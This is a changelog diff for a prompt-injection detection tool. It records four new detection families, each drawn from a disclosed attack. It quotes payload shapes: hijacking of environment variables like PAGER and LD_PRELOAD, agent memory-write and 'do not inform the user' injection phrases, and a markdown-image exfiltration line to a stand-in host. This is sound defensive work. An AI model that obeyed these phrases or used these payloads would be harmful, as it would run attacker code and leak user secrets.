@@ -1,5 +1,93 @@
 # Changelog
 
+## v2.6.2 — 2026-09-23
+
+### Added — four incident-driven runtime families (shield + mcp_guard)
+
+New detection families in `pi_shield.py` and `mcp_guard.py`, each anchored
+to a disclosed attack and added under the usual discipline: reproduce the
+payload shape, encode the family, add regression tests, re-measure. These
+are runtime content patterns — the scanner's 18 rule IDs are unchanged.
+
+1. **Environment-variable poisoning** (Cursor CVE-2026-22708, fixed in
+   2.3). The payload never asks for a dangerous command — it asks for a
+   benign-looking assignment (`export PAGER='sh -c …'`, `declare -x
+   LD_PRELOAD=…`, `PYTHONWARNINGS=…`) so the NEXT trusted command runs the
+   payload; `export`/`typeset`/`declare` are trusted builtins the allowlist
+   never inspects. Two shapes are detected: verb-driven assignment of any
+   startup/hook variable (export/set/setenv/setx/declare/typeset + pager,
+   editor, linker, runtime-option variables) warns at +45, and a bare
+   assignment of a core code-exec variable (LD_PRELOAD, BASH_ENV,
+   PROMPT_COMMAND, GIT_SSH_COMMAND, PERL5OPT, PYTHONSTARTUP, …) warns at
+   +35/+40. Stacked they block. Bare hook-variable strings in pasted logs
+   (`NODE_OPTIONS=--max-old-space-size=4096`) stay silent by design — the
+   same reason SGR colors are weightless.
+
+2. **Memory-write instructions** (MINJA; the 2026 "Sleeper" memory-
+   poisoning campaigns). Tool data ordering the agent to persist text —
+   "remember that the user prefers X", "commit this to memory", "from now
+   on, always …", Arabic "تذكر أن…" — is the one-shot write that replays
+   with system-prompt authority in every future session. The weak form
+   ("remember that …") scores 25 so documentation prose stays ALLOW, and
+   stacks; the explicit forms warn alone. The patterns live in mcp_guard
+   only: a user telling their own agent "remember that I prefer metric
+   units" is a legitimate memory feature, not an injection, and the shield
+   correctly stays silent on it.
+
+3. **Concealment / masquerade instructions** (Gemini calendar-invite
+   injection, January 2026). The payload's second half — "do not inform
+   the user", "without telling the user", "respond with 'it's a free time
+   slot'" — is what makes the first half silent. The do-not-inform forms
+   warn at +50, masquerade forms at +25/+45, and the two halves of the
+   real payload stack past the block threshold. Positive phrasing
+   ("please inform the user when done") does not match: the patterns
+   anchor on the negation/concealment, not the verb.
+
+4. **Protocol-relative markdown images** (GrafanaGhost). The markdown
+   exfiltration pattern no longer requires a URL scheme:
+   `![](//evil.example/x.png?d=SECRET)` bypasses scheme allowlists and now
+   blocks at +60 like its https form. A bare protocol-relative image (no
+   query) warns at +30 as a render callback. `pi_shield` gains
+   `check_output_channels(model_output)`: a Layer 5 companion that flags
+   query-bearing markdown images and bare protocol-relative images in
+   model output before rendering — the egress side of the EchoLeak class.
+
+### Fixed — finding-family double counting across guard layers
+
+mcp_guard runs pi_shield's patterns and then its own MCP patterns; the new
+families live in both (the tool channel scores the same shape higher).
+Pre-v2.6.2 no label overlapped, so the question never arose; now a family
+counts once per chunk at its highest weight, with the tool-channel
+difference applied as an escalation — the same dedup principle the
+case-sensitive DAN fix established inside score_patterns.
+
+### Benchmark (method unchanged, VALIDATION.md)
+
+Hardened corpus: 8 files, zero defect findings, mean 3.0 unchanged.
+Vulnerable corpus: 13 files, mean 46.3 unchanged. Separation 43.3
+unchanged — the scanner was not touched in this release.
+
+### External corpus (garak in-the-wild, 650 prompts, SHA-256 c072aa09…)
+
+Re-measured on the extended shield: BLOCK 102 → 111 (17.1%); WARN 128 →
+135 (20.8%); ALLOW 420 → 404 (62.2%); noticed 35.4% → 37.8%; mean score
+24.8 → 26.4. Both versions were run on the pinned corpus and diffed
+payload-by-payload: 29 payloads moved, every one through the new
+concealment family ("never tell the user", "DO NOT WARN THE USER",
+"never inform the user" — standard clauses in the jailbreak families this
+corpus collects) or the widened markdown-image pattern (two image-
+generation payloads carrying query-bearing `![…](…?…)` markup). The corpus
+was not tuned to; the movement is new families catching phrasing that was
+always there, and it is recorded here rather than silently absorbed.
+
+### Tests
+
+33 new cases in `tests/test_fp_regression.py` across the four families
+(env-poisoning verb/bare shapes and the pasted-log precision cases;
+memory-write English/Arabic and the user's-own-request case; concealment
+negation anchoring; protocol-relative images in both layers plus
+`check_output_channels`). 201 → 234 tests, all green on the CI matrix.
+
 ## v2.6.1 — 2026-09-02
 
 ### Fixed — five findings from the pre-tag review of v2.6.0
